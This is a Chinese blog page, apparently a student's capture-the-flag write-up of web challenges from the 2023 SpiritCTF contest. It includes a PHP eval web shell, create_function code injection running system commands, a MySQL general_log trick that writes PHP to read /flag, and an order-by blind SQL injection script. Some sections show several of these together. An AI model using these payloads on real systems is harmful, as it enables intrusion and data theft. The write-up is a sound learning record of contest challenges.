@@ -1,0 +1,211 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2023SpiritCTF-Web | 柚子のBlog</title><meta name="author" content="yoo2i"><meta name="copyright" content="yoo2i"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="校内比赛，被干碎了呜呜呜 rm -rf *12345678910111213141516171819202122232425&lt;?phphighlight_file(__FILE__);$a &#x3D; $_POST[&amp;#x27;spirit&amp;#x27;];$b &#x3D; $_POST[&amp;#x27;2023&amp;#x27;];$c &#x3D; $_POST[&amp;#x27;Are_you_a_freshman&amp;#x27;]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023SpiritCTF-Web">
+<meta property="og:url" content="https://yoo2i.github.io/2023/10/23/2023SpiritCTF-Web/index.html">
+<meta property="og:site_name" content="柚子のBlog">
+<meta property="og:description" content="校内比赛，被干碎了呜呜呜 rm -rf *12345678910111213141516171819202122232425&lt;?phphighlight_file(__FILE__);$a &#x3D; $_POST[&amp;#x27;spirit&amp;#x27;];$b &#x3D; $_POST[&amp;#x27;2023&amp;#x27;];$c &#x3D; $_POST[&amp;#x27;Are_you_a_freshman&amp;#x27;]">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yoo2i.github.io/img/avatar.png">
+<meta property="article:published_time" content="2023-10-23T05:01:29.000Z">
+<meta property="article:modified_time" content="2023-10-26T09:28:17.992Z">
+<meta property="article:author" content="yoo2i">
+<meta property="article:tag" content="Spirit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yoo2i.github.io/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yoo2i.github.io/2023/10/23/2023SpiritCTF-Web/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2023SpiritCTF-Web',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-26 17:28:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="柚子のBlog"><span class="site-name">柚子のBlog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2023SpiritCTF-Web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-23T05:01:29.000Z" title="发表于 2023-10-23 13:01:29">2023-10-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-26T09:28:17.992Z" title="更新于 2023-10-26 17:28:17">2023-10-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/">比赛记录</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2023SpiritCTF-Web"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>校内比赛，被干碎了呜呜呜</p>
+<h1 id="rm-rf"><a href="#rm-rf" class="headerlink" title="rm -rf *"></a>rm -rf *</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;spirit&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;2023&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Are_you_a_freshman&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$c</span> == <span class="string">&quot;NO&quot;</span>) &#123;</span><br><span class="line"> <span class="comment">//给老东西的福利</span></span><br><span class="line"> <span class="keyword">include</span>(<span class="string">&quot;hint.php&quot;</span>);</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&quot;flag送你了,老东西应得的!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>, <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&#x27;老实点&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.php$/i&#x27;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$a</span>))) &#123;</span><br><span class="line"> <span class="comment">//我知道你想写什么</span></span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&#x27;给你机会了,你还是不听话,哼!&#x27;</span>);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"> <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf *&quot;</span>);</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&quot;全都被我删除干净了哦 &gt;_&lt; !!!!!! QAQ不可以做坏事哦QAQ!&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;Welcome to Spirit2023!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>rm -rf *在删除的时候不会删除隐藏文件，所以可以往隐藏文件里面写马，flag在根目录。</p>
+<p><code>spirit=.haha.php&amp;2023=&lt;?php eval($_POST[1]);?&gt;</code></p>
+<p><code>1=system(&#39;tac /flag&#39;);</code></p>
+<h1 id="Mihoyo"><a href="#Mihoyo" class="headerlink" title="Mihoyo"></a>Mihoyo</h1><p>进去是一个302重定向，以为在原来的包里有flag，但是用bp看过了，没有。根据提示去平台找，源代码直接搜Spirit，拿到flag。</p>
+<h1 id="Mania"><a href="#Mania" class="headerlink" title="Mania"></a>Mania</h1><p>进去是一个音游界面，直接看源代码，发现有一段js脚本被jsfuck加密了，尝试看它的源代码。</p>
+<p>由于在“元素”里看不全，所以去源代码的索引里面看。</p>
+<p>拿到完整的js代码后去掉空格之类的无用符号，粘贴到<a target="_blank" rel="noopener" href="http://www.liminba.com/tool/jsfuckdecode/">解密网站</a>获得代码的值。（常用的那个jsfuck解密工具居然解不出来。。。。）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> gradeElements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;ResultGradeのgrade&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> levelElements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;MusicChartSelectorItemのlevel&#x27;</span>); </span><br><span class="line"><span class="keyword">let</span> newResult = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">f</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (gradeElements.<span class="property">length</span> == <span class="number">0</span> || levelElements.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        newResult = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((gradeElements[<span class="number">0</span>].<span class="property">textContent</span> == <span class="string">&#x27;A&#x27;</span> || gradeElements[<span class="number">0</span>].<span class="property">textContent</span> == <span class="string">&#x27;S&#x27;</span>) &amp;&amp; <span class="title class_">Number</span>(levelElements[<span class="number">0</span>].<span class="property">textContent</span>) &gt;= <span class="number">8</span> &amp;&amp; newResult) &#123;</span><br><span class="line">            newResult = <span class="literal">false</span>; </span><br><span class="line">            <span class="keyword">const</span> flag = <span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;s33_y0u_n3x7_71m3&#x27;</span>)).<span class="title function_">text</span>(); </span><br><span class="line">            <span class="title function_">alert</span>(flag);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newResult) &#123;</span><br><span class="line">            newResult = <span class="literal">false</span>; </span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;まだまだだね～&#x27;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">100</span>));</span><br><span class="line">        <span class="title function_">f</span>();</span><br><span class="line">    &#125;; </span><br><span class="line">        <span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>
+
+<p>发现拿到flag的条件是<code>gradeElements[0].textContent == &#39;A&#39; || gradeElements[0].textContent == &#39;S&#39;</code>并且<code>Number(levelElements[0].textContent) &gt;= 8</code>并且<code>newResult</code>,说人话就是游戏评级达到a或s并且newResult为true并且level数组的第一位要大于等于8。</p>
+<p>随便开一局游戏（这样才能让脚本运行），然后等到结束，会有弹窗说日语。在源代码里面调试，点暂停，然后去控制台改变量的值，输入</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gradeElements[<span class="number">0</span>].<span class="property">textContent</span> = <span class="string">&#x27;S&#x27;</span></span><br><span class="line">levelElements[<span class="number">0</span>].<span class="property">textContent</span> = <span class="number">9</span></span><br><span class="line">newResult = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>取消暂停，弹出了flag。</p>
+<p>如果没解密那串jsfuck的话，在游戏结束弹窗日语的时候点暂停，然后关闭弹窗也能看见被解密的代码。</p>
+<hr>
+<p>看了cracktc的题解，直接访问s33_y0u_n3x7_71m3也可以呦。</p>
+<h1 id="HIDDEN-FLAG"><a href="#HIDDEN-FLAG" class="headerlink" title="HIDDEN_FLAG"></a>HIDDEN_FLAG</h1><p>首先根据notfound界面确定是 php -S 0.0.0.0:80启动的服务。（我不知道啊，后来提示说的）</p>
+<p>这个服务在7.4.21之前有源码泄露问题。</p>
+<p>复现的话注意三点，一是回车换行的数量；二是第二个get的路径应该是x.x，比如1.js；三是关闭bp的自动补全Content-Length。</p>
+<p><img src="/2023spiritctf1.png" alt="1"></p>
+<p>发现源码有一个 create_function，两个位置都可以注入的。</p>
+<p>在前边注：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;)&#123;&#125;system(&#x27;cat /flag&#x27;);//&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>));<span class="comment">//bin2hex能接受字符串并且将其转为16进制</span></span><br></pre></td></tr></table></figure>
+
+<p>在后边注：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;&#125;system(&#x27;ls&#x27;);//&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>但是本题的后一个参数是要自己base64解码的，然后靶机给编码，这样只是传输被解码烂了的奇怪字符，所以从前边注入。</p>
+<p>为什么没做出来这题呢。。。第一个问题是看到了变量a前后的那些字符串，下意识以为a上不能注；第二个问题是hex2bin和bin2hex这两个函数把我绕晕了；第三个问题是最后几次尝试的顺序有问题。下次做这种疑惑问题的时候可以把自己的问题都列出来然后开个php环境尝试解决！</p>
+<h1 id="MyGO"><a href="#MyGO" class="headerlink" title="MyGO!!!!!"></a>MyGO!!!!!</h1><p><del>这题在场上搞了一下午也没搞出来</del></p>
+<p>进去发现一个输入框，看url是sql查询，尝试注一下吧，结果咋注咋报错，最后发现是可以直接执行sql语句的。接着查了所有表没查到flag；查了MySQL提权复现也没成功。这时候给了Hint，最后一条代表任意文件可读取，第一条代表Dockerfile没删，于是先读Dockerfile，发现启动脚本docker-entrypoint.sh，查看脚本，发现根目录有flag，环境变量本来也有但是被cracktc删掉了，还发现了mygo文件可下载。用Linux查看mygo发现是Linux的可执行文件，怀疑是go语言编写的源代码<del>但是不会逆不知道咋能看见代码就卡死在这了</del></p>
+<p>下面都来自cracktc的题解了：因为是go语言编写的，并且直接copy了，所以猜测main.go(go的main函数一般在这里面)也可以访问，发现确实可以访问，里面有个展示图片的php文件，rand_img.php，看一下rand_img.php，发现每次随机选一个图片复制到image.jpg中。本来想用这个rand_img.php写shell，但是没成功，看题解是通过image.jpg带出写的内容的，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&quot;/app/rand_img.php&quot;;</span><br><span class="line">set global general_log = &#x27;ON&#x27;;</span><br><span class="line">select &quot;&lt;?php file_put_contents(&#x27;image.jpg&#x27;, file_get_contents(&#x27;/flag&#x27;)); ?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这时候image.jpg就是flag内容了，下下来记事本直接看。</p>
+<h1 id="ChatGPT的web题"><a href="#ChatGPT的web题" class="headerlink" title="ChatGPT的web题"></a>ChatGPT的web题</h1><p>首先，不要创建账号是真的让你不要创建，创建了没法orderby盲注的<del>崩溃了</del></p>
+<p>审这个博客发现有一个任意文件读取漏洞，想上传文件出发phar反序列化，但是必须是admin才能上传，于是想办法注出admin的密码，这里用到了orderby盲注，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=<span class="string">&quot;.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://202.198.27.90:40090/login.php&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&#x27;username1&#x27;</span>:<span class="string">&quot;&#x27; or 1 union select 1,2,&#x27;&#123;0&#125;&#x27; order by 3#&quot;</span>.<span class="built_in">format</span>(k+j),</span><br><span class="line">        <span class="string">&#x27;pwd1&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url,data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> response.text):</span><br><span class="line">            k = k+<span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么我的bp用一样的payload就是注不出来密码，<del>赛场上被急晕</del>,还是脚本好使，得多写啊！</p>
+<p>拿到密码着手phar反序列化</p>
+<p>未完待续。。。。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yoo2i.github.io">yoo2i</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yoo2i.github.io/2023/10/23/2023SpiritCTF-Web/">https://yoo2i.github.io/2023/10/23/2023SpiritCTF-Web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yoo2i.github.io" target="_blank">柚子のBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Spirit/">Spirit</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/01/cs144-lab1/" title="cs144-lab1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">cs144-lab1</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/16/20230xGame-Web%E9%A2%98%E8%A7%A3/" title="20230xGame-Web题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">20230xGame-Web题解</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yoo2i</div><div class="author-info__description">No one</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎联系邮箱yoo2i@qq.com与我交流~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#rm-rf"><span class="toc-number">1.</span> <span class="toc-text">rm -rf *</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mihoyo"><span class="toc-number">2.</span> <span class="toc-text">Mihoyo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mania"><span class="toc-number">3.</span> <span class="toc-text">Mania</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HIDDEN-FLAG"><span class="toc-number">4.</span> <span class="toc-text">HIDDEN_FLAG</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MyGO"><span class="toc-number">5.</span> <span class="toc-text">MyGO!!!!!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ChatGPT%E7%9A%84web%E9%A2%98"><span class="toc-number">6.</span> <span class="toc-text">ChatGPT的web题</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/21/cs61b-lab%E8%B8%A9%E5%9D%91%E5%85%A8%E6%B5%81%E7%A8%8B/" title="cs61b-lab">cs61b-lab</a><time datetime="2023-11-21T07:53:57.000Z" title="发表于 2023-11-21 15:53:57">2023-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/14/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web%E9%A2%98%E8%A7%A3/" title="2023极客大挑战-Web题解">2023极客大挑战-Web题解</a><time datetime="2023-11-14T11:17:19.000Z" title="发表于 2023-11-14 19:17:19">2023-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/01/cs144-lab1/" title="cs144-lab1">cs144-lab1</a><time datetime="2023-11-01T05:53:33.000Z" title="发表于 2023-11-01 13:53:33">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/23/2023SpiritCTF-Web/" title="2023SpiritCTF-Web">2023SpiritCTF-Web</a><time datetime="2023-10-23T05:01:29.000Z" title="发表于 2023-10-23 13:01:29">2023-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/16/20230xGame-Web%E9%A2%98%E8%A7%A3/" title="20230xGame-Web题解">20230xGame-Web题解</a><time datetime="2023-10-16T02:12:42.000Z" title="发表于 2023-10-16 10:12:42">2023-10-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By yoo2i</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax 